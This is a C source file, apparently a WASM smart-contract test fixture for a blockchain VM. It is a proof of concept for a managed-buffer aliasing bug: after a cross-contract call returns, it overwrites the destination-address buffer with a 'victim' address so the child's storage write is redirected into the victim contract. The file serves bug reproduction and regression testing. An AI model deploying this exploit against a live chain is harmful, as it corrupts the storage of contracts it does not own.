#include "../mxvm/context.h"
#include "../mxvm/bigInt.h"

// Deliberately does NOT include ../mxvm/test_utils.h: buildWasmC.sh links
// with `wasm-ld --export-all`, so any non-static helper pulled in from that
// header (most take parameters / return values) would also get exported and
// trip the node's ValidateFunctionArities check (every exported function
// must be void->void), causing a client-side ContractInvalid on deploy.
// The one helper this file needs (finishResult) is reimplemented below.

// Parent contract for the managed-buffer aliasing PoC: exercises
// managedExecuteOnDestContext directly (the managed-buffer-handle based EI,
// as opposed to the raw executeOnDestContext used by the other
// exec-dest-ctx-* fixtures) and then mutates the destination-address managed
// buffer *after* the call returns.
//
// This reproduces, at the real WASM/EI level, a managed-buffer aliasing bug:
// the destination handle's underlying byte slice was shared (not copied)
// with the OutputAccount.Address stored in the merged VM output, so
// overwriting it post-call retargeted where the child's storage writes got
// applied when the block was processed.

// EI functions not declared in the shared mxvm/context.h (managed buffer /
// managed exec variants). Declared locally so the shared header used by all
// other test fixtures stays untouched.
extern int mBufferNew();
extern int mBufferNewFromBytes(byte *dataOffset, int dataLength);
extern int mBufferSetByteSlice(int mBufferHandle, int startingPosition, int dataLength, byte *dataOffset);

extern int managedExecuteOnDestContext(
		long long gas,
		int addressHandle,
		int valueHandle,
		int functionHandle,
		int argumentsHandle,
		int resultHandle);

byte functionName[] = "writeStorage";
byte storageKey[] = "managed-exec-alias-key";
byte storageValue[] = "managed-exec-alias-should-stay-in-child";

// static: must not be exported (see note above on --export-all).
static void finishResult(int result) {
	if (result == 0) {
		byte message[] = "succ";
		finish(message, 4);
	} else if (result == 1) {
		byte message[] = "fail";
		finish(message, 4);
	} else {
		byte message[] = "unkn";
		finish(message, 4);
	}
}

void init() {}

// Executes writeStorage on the child contract via managedExecuteOnDestContext,
// then overwrites the destination-address managed buffer with the victim's
// address after the call has already returned.
//
// Arguments:
//   0: child contract address   (32 bytes)
//   1: victim contract address  (32 bytes)
void retargetChildStorage() {
	int numArgs = getNumArguments();
	if (numArgs != 2) {
		byte message[] = "wrong number of arguments";
		signalError(message, 25);
	}

	byte childAddr[32];
	getArgument(0, childAddr);

	byte victimAddr[32];
	getArgument(1, victimAddr);

	int destHandle = mBufferNewFromBytes(childAddr, 32);
	int functionHandle = mBufferNewFromBytes(functionName, sizeof(functionName) - 1);
	int valueHandle = bigIntNew(0);

	int keyHandle = mBufferNewFromBytes(storageKey, sizeof(storageKey) - 1);
	int valHandle = mBufferNewFromBytes(storageValue, sizeof(storageValue) - 1);

	// argumentsHandle must be a managed buffer containing the concatenation
	// of 4-byte big-endian managed-buffer handles (see
	// ReadManagedVecOfManagedBuffers in kvm/vmhost/contexts/managedType.go).
	byte argsVecBytes[8] = {0, 0, 0, 0, 0, 0, 0, 0};
	argsVecBytes[0] = (byte)(keyHandle >> 24);
	argsVecBytes[1] = (byte)(keyHandle >> 16);
	argsVecBytes[2] = (byte)(keyHandle >> 8);
	argsVecBytes[3] = (byte)keyHandle;
	argsVecBytes[4] = (byte)(valHandle >> 24);
	argsVecBytes[5] = (byte)(valHandle >> 16);
	argsVecBytes[6] = (byte)(valHandle >> 8);
	argsVecBytes[7] = (byte)valHandle;
	int argsHandle = mBufferNewFromBytes(argsVecBytes, 8);

	int resultHandle = mBufferNew();

	int result = managedExecuteOnDestContext(
			5000000,
			destHandle,
			valueHandle,
			functionHandle,
			argsHandle,
			resultHandle);

	// Mutate the destination handle's buffer AFTER the call returned. If the
	// aliasing bug is present, this retargets the merged OutputAccount.Address
	// for the child's storage update to the victim.
	mBufferSetByteSlice(destHandle, 0, 32, victimAddr);

	finishResult(result);
}
